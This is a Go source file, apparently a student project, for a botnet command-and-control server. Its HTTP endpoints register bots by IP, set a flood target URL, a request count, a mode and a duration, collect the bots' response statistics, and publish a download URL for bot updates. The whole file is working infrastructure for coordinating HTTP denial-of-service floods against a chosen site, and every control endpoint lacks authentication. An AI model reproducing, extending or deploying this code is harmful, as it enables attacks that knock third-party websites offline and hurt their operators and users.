package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/gin-contrib/cors"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3/s3manager"
	"github.com/gin-gonic/gin"
	"github.com/joho/godotenv"
)

type BotnetServer struct {
	Status         bool
	ConnectedBots  map[string]time.Time
	BotsResponses  []BotStats
	BotVersionName string
	BotFileUrl     string
}

type BotStats struct {
	Target       string
	Status       []int
	ResponseTime time.Time
}

type BotStatsReqBody struct {
	Target string `json:"target"`
	Status []int  `json:"status"`
}

type TargetInfo struct {
	TargetUrl   string
	RequestNum  int
	Mode        string
	TimeSeconds int
}

type ServerStatusReqBody struct {
	Status bool `json:"status"`
}

type ChangeTargetReqBody struct {
	Target string `json:"target"`
}

type SetRequestsNumberReqBody struct {
	RequestsNumber int `json:"requestsNumber"`
}

type SetModeReqBody struct {
	Mode string `json:"mode"`
}

type SetTimeSecondsReqBody struct {
	TimeSeconds int `json:"timeSeconds"`
}

type SetBotVersionInfoReqBody struct {
	BotVersionName string `json:"botVersionName"`
	BotFileUrl     string `json:"botFileUrl"`
}

var AccessKeyID string
var SecretAccessKey string
var MyRegion string
var filepath string

var targetInfo = TargetInfo{"https://theuselessweb.com/", 10, "timeMode", 1}
var botnetServer = BotnetServer{false, make(map[string]time.Time), []BotStats{}, "bot1", "https://acsprojectfiles.s3.amazonaws.com/bot1.go"}
var PORT = 5000

func LoadEnv() {
	err := godotenv.Load(".env")

	if err != nil {
		log.Fatalf("Error loading .env file")
		os.Exit(1)
	}
}

//GetEnvWithKey : get env value
func GetEnvWithKey(key string) string {
	return os.Getenv(key)
}

func ConnectAws() *session.Session {
	AccessKeyID = GetEnvWithKey("AWS_ACCESS_KEY_ID")
	SecretAccessKey = GetEnvWithKey("AWS_SECRET_ACCESS_KEY")
	MyRegion = GetEnvWithKey("AWS_REGION")

	sess, err := session.NewSession(
		&aws.Config{
			Region: aws.String(MyRegion),
			Credentials: credentials.NewStaticCredentials(
				AccessKeyID,
				SecretAccessKey,
				"", // a token will be created when the session it's used.
			),
		})

	if err != nil {
		panic(err)
	}

	return sess
}

func UploadImage(c *gin.Context) {
	sess := c.MustGet("sess").(*session.Session)
	uploader := s3manager.NewUploader(sess)
	MyBucket := GetEnvWithKey("BUCKET_NAME")
	file, header, err := c.Request.FormFile("file")
	filename := header.Filename

	//upload to the s3 bucket
	up, err := uploader.Upload(&s3manager.UploadInput{
		Bucket: aws.String(MyBucket),
		ACL:    aws.String("public-read"),
		Key:    aws.String(filename),
		Body:   file,
	})

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":    "Failed to upload file",
			"uploader": up,
		})

		return
	}

	filepath = "https://" + MyBucket + "." + "s3.amazonaws.com/" + filename
	c.JSON(http.StatusOK, gin.H{
		"filepath": filepath,
	})
}

func PostSendBotStats(c *gin.Context) {
	var botStatsResponse BotStatsReqBody
	err := c.ShouldBindJSON(&botStatsResponse)

	if err == nil {
		botStats := BotStats{targetInfo.TargetUrl, botStatsResponse.Status, time.Now()}
		botnetServer.BotsResponses = append(botnetServer.BotsResponses, botStats)

		c.JSON(200, botStatsResponse)
		fmt.Println(len(botStats.Status))
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Error getting bot stats",
		})
		return
	}
}

func GetTargetInfo(c *gin.Context) {
	botnetServer.ConnectedBots[c.ClientIP()] = time.Now()

	c.JSON(200, gin.H{
		"status":      botnetServer.Status,
		"targetUrl":   targetInfo.TargetUrl,
		"requestNum":  targetInfo.RequestNum,
		"mode":        targetInfo.Mode,
		"timeSeconds": targetInfo.TimeSeconds,
	})
}

func SetServerStatus(c *gin.Context) {
	var serverStatusReqBody ServerStatusReqBody
	err := c.ShouldBindJSON(&serverStatusReqBody)

	if err == nil {
		botnetServer.Status = serverStatusReqBody.Status

		c.JSON(200, gin.H{
			"message": "Server status has been set to " + strconv.FormatBool(serverStatusReqBody.Status),
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting server status",
		})
		return
	}
}

func GetServerStatus(c *gin.Context) {
	c.JSON(200, gin.H{
		"status": botnetServer.Status,
	})
}

func ChangeTarget(c *gin.Context) {
	var changeTargetReqBody ChangeTargetReqBody
	err := c.ShouldBindJSON(&changeTargetReqBody)

	if err == nil {
		targetInfo.TargetUrl = changeTargetReqBody.Target

		c.JSON(200, gin.H{
			"message": "Target has been set to " + changeTargetReqBody.Target,
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while changin target",
		})
		return
	}
}

func GetConnectedBots(c *gin.Context) {
	connectedBots := []string{}

	for botIp, lastConnectionTime := range botnetServer.ConnectedBots {
		activeConnectionTimeBound := time.Now().Add(-10 * time.Minute)

		if !lastConnectionTime.Before(activeConnectionTimeBound) {
			connectedBots = append(connectedBots, botIp)
		}
	}

	c.JSON(200, gin.H{
		"connectedBots": connectedBots,
	})
}

func GetBotsStats(c *gin.Context) {
	c.JSON(200, gin.H{
		"stats": botnetServer.BotsResponses,
	})
}

func GetBotVersionInfo(c *gin.Context) {
	c.JSON(200, gin.H{
		"botVersionName": botnetServer.BotVersionName,
		"botFileUrl":     botnetServer.BotFileUrl,
	})
}

func SetBotVersionInfo(c *gin.Context) {
	var setBotVersionInfoReqBody SetBotVersionInfoReqBody
	err := c.ShouldBindJSON(&setBotVersionInfoReqBody)

	if err == nil {
		botnetServer.BotVersionName = setBotVersionInfoReqBody.BotVersionName
		botnetServer.BotFileUrl = setBotVersionInfoReqBody.BotFileUrl

		c.JSON(200, gin.H{
			"message": "BotVersionName has been set to " + setBotVersionInfoReqBody.BotVersionName +
				", BotFileUrl has been set to " + setBotVersionInfoReqBody.BotFileUrl,
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting bot version information",
		})
		return
	}
}

func SetRequestsNumber(c *gin.Context) {
	var setRequestsNumberReqBody SetRequestsNumberReqBody
	err := c.ShouldBindJSON(&setRequestsNumberReqBody)

	if err == nil {
		targetInfo.RequestNum = setRequestsNumberReqBody.RequestsNumber

		c.JSON(200, gin.H{
			"message": "Requests number has been set to " + strconv.Itoa(setRequestsNumberReqBody.RequestsNumber),
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting requests number",
		})
		return
	}
}

func SetTimeSeconds(c *gin.Context) {
	var setTimeSecondsReqBody SetTimeSecondsReqBody
	err := c.ShouldBindJSON(&setTimeSecondsReqBody)

	if err == nil {
		targetInfo.TimeSeconds = setTimeSecondsReqBody.TimeSeconds

		c.JSON(200, gin.H{
			"message": "TimeSeconds has been set to " + strconv.Itoa(setTimeSecondsReqBody.TimeSeconds),
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting timeSeconds",
		})
		return
	}
}

func SetMode(c *gin.Context) {
	var setModeReqBody SetModeReqBody
	err := c.ShouldBindJSON(&setModeReqBody)

	if err == nil {
		if setModeReqBody.Mode == "requestMode" || setModeReqBody.Mode == "timeMode" {
			targetInfo.Mode = setModeReqBody.Mode

			c.JSON(200, gin.H{
				"message": "Mode has been set to " + setModeReqBody.Mode,
			})
			return
		}

		c.JSON(404, gin.H{
			"message": "Invalid mode value",
		})
		return

	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting mode",
		})
		return
	}
}

func main() {
	LoadEnv()

	sess := ConnectAws()

	server := gin.Default()
	server.Use(cors.Default())

	server.Use(func(c *gin.Context) {
		c.Set("sess", sess)
		c.Next()
	})

	server.GET("/getTargetInfo", GetTargetInfo)
	server.GET("/getServerStatus", GetServerStatus)
	server.GET("/getConnectedBots", GetConnectedBots)
	server.GET("/getBotsStats", GetBotsStats)
	server.GET("/getBotVersionInfo", GetBotVersionInfo)
	server.POST("/sendBotStat", PostSendBotStats)
	server.POST("/setServerStatus", SetServerStatus)
	server.POST("/changeTarget", ChangeTarget)
	server.POST("/setRequestsNumber", SetRequestsNumber)
	server.POST("/setMode", SetMode)
	server.POST("/setTimeSeconds", SetTimeSeconds)
	server.POST("/uploadFile", UploadImage)
	server.POST("/setBotVersionInfo", SetBotVersionInfo)

	server.Run(":" + strconv.Itoa(PORT))
}
